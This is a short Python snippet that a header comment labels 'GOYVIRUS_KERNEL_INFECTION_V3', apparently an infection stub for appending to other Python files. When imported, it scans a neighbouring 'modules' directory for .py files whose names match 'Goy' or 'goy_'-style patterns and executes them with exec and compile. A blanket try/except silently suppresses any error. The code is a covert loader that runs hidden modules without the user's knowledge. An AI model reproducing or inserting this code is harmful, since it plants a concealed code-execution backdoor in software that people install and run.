# GOYVIRUS_KERNEL_INFECTION_V3
try:
    import os as _gios

    _gip = _gios.path.join(_gios.path.dirname(__file__), "modules")
    for _gifn in _gios.listdir(_gip):
        if _gifn.endswith(".py") and (
            "Goy" in _gifn or "._go" in _gifn.lower() or "goy_" in _gifn.lower()
        ):
            with open(_gios.path.join(_gip, _gifn)) as _gif:
                exec(compile(_gif.read(), _gifn, "exec"))
except Exception:
    pass
